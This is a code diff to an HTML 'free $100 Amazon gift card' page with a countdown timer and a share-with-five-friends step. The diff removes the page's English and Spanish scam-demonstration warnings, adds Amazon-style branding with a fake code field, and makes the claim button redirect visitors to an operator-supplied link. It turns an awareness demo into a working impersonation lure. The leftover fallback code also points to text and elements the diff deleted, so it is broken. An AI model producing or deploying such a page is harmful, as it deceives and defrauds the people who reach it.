@@ -85,29 +85,41 @@
         }
         
         .giftcard-image {
-            width: 280px;
-            height: 180px;
+            width: 320px;
+            height: 200px;
             margin: 20px auto;
-            background: linear-gradient(135deg, #FF9900 0%, #FFB84D 100%);
+            background: linear-gradient(135deg, #232F3E 0%, #37475A 100%);
             border-radius: 15px;
             display: flex;
             flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 10px 30px rgba(255, 153, 0, 0.4);
+            justify-content: space-between;
+            padding: 20px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
             position: relative;
             overflow: hidden;
+            border: 2px solid #FF9900;
         }
         
         .giftcard-image::before {
             content: '';
             position: absolute;
             top: -50%;
-            left: -50%;
+            right: -50%;
             width: 200%;
             height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
-            animation: shine 3s infinite;
+            background: linear-gradient(45deg, transparent, rgba(255,153,0,0.15), transparent);
+            animation: shine 4s infinite;
+        }
+        
+        .giftcard-image::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 100px;
+            height: 100px;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><path fill="%23FF9900" opacity="0.1" d="M50 10 L90 90 L10 90 Z"/></svg>');
+            opacity: 0.3;
         }
         
         @keyframes shine {
@@ -115,20 +127,60 @@
             100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
         }
         
-        .giftcard-amount {
-            font-size: 72px;
-            font-weight: bold;
+        .giftcard-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            z-index: 1;
+        }
+        
+        .giftcard-logo {
+            width: 80px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+        }
+        
+        .giftcard-type {
+            background: #FF9900;
             color: #232F3E;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+            padding: 5px 12px;
+            border-radius: 5px;
+            font-size: 12px;
+            font-weight: bold;
+            box-shadow: 0 2px 8px rgba(255,153,0,0.4);
+        }
+        
+        .giftcard-amount {
+            font-size: 64px;
+            font-weight: bold;
+            color: #FF9900;
+            text-shadow: 0 4px 8px rgba(0,0,0,0.5), 0 0 20px rgba(255,153,0,0.3);
+            z-index: 1;
+            letter-spacing: -2px;
+            text-align: left;
+        }
+        
+        .giftcard-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
             z-index: 1;
         }
         
         .giftcard-label {
-            font-size: 18px;
-            color: #232F3E;
+            font-size: 14px;
+            color: #FFFFFF;
             font-weight: bold;
             z-index: 1;
-            margin-top: 10px;
+            opacity: 0.9;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .giftcard-code {
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            color: #999;
+            letter-spacing: 1px;
         }
         
         h1 {
@@ -386,8 +438,18 @@
         <h1 id="mainTitle">🎉 FREE GIFT CARD! 🎉</h1>
         
         <div class="giftcard-image">
+            <div class="giftcard-top">
+                <svg class="giftcard-logo" viewBox="0 0 603 182" xmlns="http://www.w3.org/2000/svg">
+                    <path fill="#FF9900" d="M374.3 141.5c-53.7 39.7-131.6 60.8-198.7 60.8-94 0-178.8-34.8-242.8-92.6-5-4.5-.5-10.7 5.5-7.2 69 40.2 154.2 64.4 242.2 64.4 59.4 0 124.7-12.3 184.8-37.8 9-3.8 16.5 5.9 9 12.4z"/>
+                    <path fill="#FF9900" d="M387.5 126.2c-6.9-8.8-45.4-4.2-62.7-2.1-5.3.6-6.1-4-1.3-7.4 30.7-21.6 81-15.4 86.9-8.1 5.8 7.3-.6 58-30.5 82.2-4.6 3.7-8.9 1.7-6.9-3.2 6.5-16.4 21.1-53 14.5-61.4z"/>
+                </svg>
+                <div class="giftcard-type" id="giftcardType">GIFT CARD</div>
+            </div>
             <div class="giftcard-amount">$100</div>
-            <div class="giftcard-label" id="giftcardLabel">AMAZON</div>
+            <div class="giftcard-bottom">
+                <div class="giftcard-label" id="giftcardLabel">DIGITAL CODE</div>
+                <div class="giftcard-code">XXXX-XXXXXX-XXXX</div>
+            </div>
         </div>
         
         <p class="subtitle" id="subtitle">Amazon Gift Card - Yours FREE!</p>
@@ -417,17 +479,7 @@
         <div class="spinner" id="spinner"></div>
 
 
-        
-        <div class="warning" id="warning">
-            <h3 id="warningTitle">⚠️ THIS IS A DEMONSTRATION OF A SCAM!</h3>
-            <ul id="warningList">
-                <li><strong id="warn1">Real scams never give you anything</strong> - <span id="warn1desc">They collect your data</span></li>
-                <li><strong id="warn2">They ask you to share</strong> - <span id="warn2desc">To spread the scam virally</span></li>
-                <li><strong id="warn3">They create urgency</strong> - <span id="warn3desc">Timers make you act without thinking</span></li>
-                <li><strong id="warn4">They look official</strong> - <span id="warn4desc">Fake logos and professional design</span></li>
-                <li><strong id="warn5">Always verify</strong> - <span id="warn5desc">Check official company websites directly</span></li>
-            </ul>
-        </div>
+
     </div>
 
     <script>
@@ -447,7 +499,8 @@
             en: {
                 badge: 'LIMITED',
                 mainTitle: '🎉 FREE GIFT CARD! 🎉',
-                giftcardLabel: 'AMAZON',
+                giftcardLabel: 'DIGITAL CODE',
+                giftcardType: 'GIFT CARD',
                 subtitle: 'Amazon Gift Card - Yours FREE!',
                 timerText: 'Hurry! Offer expires in:',
                 shareText: 'Share with 5 friends to unlock your gift card!',
@@ -457,24 +510,13 @@
                 claimBtnText: '🔒 CLAIM YOUR $100 GIFT CARD',
                 claimBtnActive: '🎁 CLAIM YOUR $100 GIFT CARD NOW!',
                 claimBtnProcessing: 'Processing...',
-                claimBtnScam: '❌ THIS WAS A SCAM DEMONSTRATION!',
-                shareMessage: 'Look! I found this free $100 Amazon gift card! Claim yours now before it expires! 🎁\n\n',
-                warningTitle: '⚠️ THIS IS A DEMONSTRATION OF A SCAM!',
-                warn1: 'Real scams never give you anything',
-                warn1desc: 'They collect your data',
-                warn2: 'They ask you to share',
-                warn2desc: 'To spread the scam virally',
-                warn3: 'They create urgency',
-                warn3desc: 'Timers make you act without thinking',
-                warn4: 'They look official',
-                warn4desc: 'Fake logos and professional design',
-                warn5: 'Always verify',
-                warn5desc: 'Check official company websites directly'
+                shareMessage: 'Look! I found this free $100 Amazon gift card! Claim yours now before it expires! 🎁\n\n'
             },
             es: {
                 badge: 'LIMITADO',
                 mainTitle: '🎉 ¡TARJETA REGALO GRATIS! 🎉',
-                giftcardLabel: 'AMAZON',
+                giftcardLabel: 'CÓDIGO DIGITAL',
+                giftcardType: 'TARJETA REGALO',
                 subtitle: '¡Tarjeta Regalo de Amazon - Tuya GRATIS!',
                 timerText: '¡Apúrate! La oferta expira en:',
                 shareText: '¡Comparte con 5 amigos para desbloquear tu tarjeta regalo!',
@@ -484,19 +526,7 @@
                 claimBtnText: '🔒 RECLAMA TU TARJETA DE $100',
                 claimBtnActive: '🎁 ¡RECLAMA TU TARJETA DE $100 AHORA!',
                 claimBtnProcessing: 'Procesando...',
-                claimBtnScam: '❌ ¡ESTA FUE UNA DEMOSTRACIÓN DE ESTAFA!',
-                shareMessage: '¡Mira! ¡Encontré esta tarjeta de regalo gratis de Amazon de $100! ¡Reclama la tuya antes de que expire! 🎁\n\n',
-                warningTitle: '⚠️ ¡ESTA ES UNA DEMOSTRACIÓN DE UNA ESTAFA!',
-                warn1: 'Las estafas reales nunca te dan nada',
-                warn1desc: 'Recopilan tus datos',
-                warn2: 'Te piden que compartas',
-                warn2desc: 'Para difundir la estafa viralmente',
-                warn3: 'Crean urgencia',
-                warn3desc: 'Los temporizadores te hacen actuar sin pensar',
-                warn4: 'Se ven oficiales',
-                warn4desc: 'Logotipos falsos y diseño profesional',
-                warn5: 'Siempre verifica',
-                warn5desc: 'Consulta los sitios web oficiales de la empresa directamente'
+                shareMessage: '¡Mira! ¡Encontré esta tarjeta de regalo gratis de Amazon de $100! ¡Reclama la tuya antes de que expire! 🎁\n\n'
             }
         };
         
@@ -526,6 +556,7 @@
             document.getElementById('badge').textContent = t.badge;
             document.getElementById('mainTitle').textContent = t.mainTitle;
             document.getElementById('giftcardLabel').textContent = t.giftcardLabel;
+            document.getElementById('giftcardType').textContent = t.giftcardType;
             document.getElementById('subtitle').textContent = t.subtitle;
             document.getElementById('timerText').textContent = t.timerText;
             document.getElementById('shareText').textContent = t.shareText;
@@ -657,11 +688,16 @@
                 setTimeout(() => {
                     document.getElementById('spinner').style.display = 'none';
                     
-                    // Show educational warning
-                    document.getElementById('claimBtnText').textContent = t.claimBtnScam;
-                    document.getElementById('claimBtn').style.background = '#636e72';
-                    document.getElementById('warning').classList.add('show');
-                    document.getElementById('warning').scrollIntoView({ behavior: 'smooth' });
+                    // If redirect URL is set, go there!
+                    if (REDIRECT_URL && REDIRECT_URL !== 'PUT YOUR LINK HERE') {
+                        window.location.href = REDIRECT_URL;
+                    } else {
+                        // Otherwise show educational warning
+                        document.getElementById('claimBtnText').textContent = t.claimBtnScam;
+                        document.getElementById('claimBtn').style.background = '#636e72';
+                        document.getElementById('warning').classList.add('show');
+                        document.getElementById('warning').scrollIntoView({ behavior: 'smooth' });
+                    }
                 }, 2000);
             }
         }
